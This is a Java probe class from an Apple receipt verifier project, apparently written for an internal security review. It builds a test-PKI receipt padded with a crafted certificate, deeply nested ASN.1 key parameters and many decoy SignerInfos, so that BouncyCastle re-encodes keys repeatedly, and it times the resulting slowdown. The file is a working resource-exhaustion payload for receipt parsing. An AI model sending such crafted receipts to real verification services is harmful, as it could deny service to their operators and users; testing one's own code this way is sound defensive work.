package io.github.emindeniz99.applepurchasereceiptverifier;

import org.bouncycastle.asn1.*;
import org.bouncycastle.asn1.cms.*;
import org.bouncycastle.asn1.pkcs.PKCSObjectIdentifiers;
import org.bouncycastle.asn1.x500.X500Name;
import org.bouncycastle.asn1.x509.*;

/**
 * Review 5's probe for the subjectKeyIdentifier amplifier: the genuine
 * test-PKI receipt plus one bag entry shaped as a certificate the root
 * issued, with no subjectKeyIdentifier extension, whose key parameters are
 * NULL ({@code null}), SEQUENCEs nested 55 deep ({@code seq55}, about 2.1
 * MB) or nested SETs inside an EXTERNAL's data value descriptor
 * ({@code external}); and {@code copies} SignerInfos in subjectKeyIdentifier
 * form ahead of the genuine one. Matching each against the entry makes
 * BouncyCastle's {@code MSOutlookKeyIdCalculator} DER-encode its
 * SubjectPublicKeyInfo again. Verified three times in one JVM, the first
 * cold.
 *
 * <p>Args: null|seq55|external copies
 */
public class SkiSignerInfoProbe {
    public static void main(String[] a) throws Exception {
        String mode = a[0];
        int copies = Integer.parseInt(a[1]);
        TestPki pki = TestPki.receipt();
        X500Name rootName = X500Name.getInstance(pki.root.getSubjectX500Principal().getEncoded());
        SubjectPublicKeyInfo key = SubjectPublicKeyInfo.getInstance(pki.leaf.getPublicKey().getEncoded());
        ASN1Encodable parameters;
        if (mode.equals("seq55")) {
            parameters = NestedSequenceProbe.nestedSequences(55, 13000);
        } else if (mode.equals("external")) {
            parameters = ExternalDescriptorProbe.external(
                    ExternalDescriptorProbe.nestedSets(30, ExternalDescriptorProbe.CAP_DER - 100_000));
        } else {
            parameters = DERNull.INSTANCE;
        }
        SubjectPublicKeyInfo strangerKey = new SubjectPublicKeyInfo(
                new AlgorithmIdentifier(PKCSObjectIdentifiers.rsaEncryption, parameters),
                key.getPublicKeyData().getBytes());
        DLSequence stranger = ExternalDescriptorProbe.certificateShaped(
                ExternalDescriptorProbe.SHA256_WITH_RSA, rootName, new X500Name("CN=x"), strangerKey);

        SignedData genuine = ExternalDescriptorProbe.signedData(
                pki.signReceipt(TestPki.singleAttributePayload(9999, new byte[16])));
        SignerInfo signer = SignerInfo.getInstance(genuine.getSignerInfos().getObjectAt(0));
        ASN1EncodableVector bag = new ASN1EncodableVector();
        for (int i = 0; i < genuine.getCertificates().size(); i++) {
            bag.add(genuine.getCertificates().getObjectAt(i));
        }
        bag.add(stranger);
        ASN1EncodableVector signerInfos = new ASN1EncodableVector();
        for (int i = 0; i < copies; i++) {
            byte[] ski = new byte[20];
            ski[0] = (byte) i;
            signerInfos.add(new DLSequence(new ASN1Encodable[] {
                new ASN1Integer(3),
                new SignerIdentifier(new DEROctetString(ski)),
                signer.getDigestAlgorithm(),
                new DLTaggedObject(false, 0, signer.getAuthenticatedAttributes()),
                signer.getDigestEncryptionAlgorithm(),
                signer.getEncryptedDigest()
            }));
        }
        signerInfos.add(signer);
        byte[] receipt = ExternalDescriptorProbe.receipt(genuine, new DLSet(bag), new DLSet(signerInfos));
        ExternalDescriptorProbe.time("ski-signerinfos key=" + mode + " copies=" + copies, pki, receipt);
    }
}
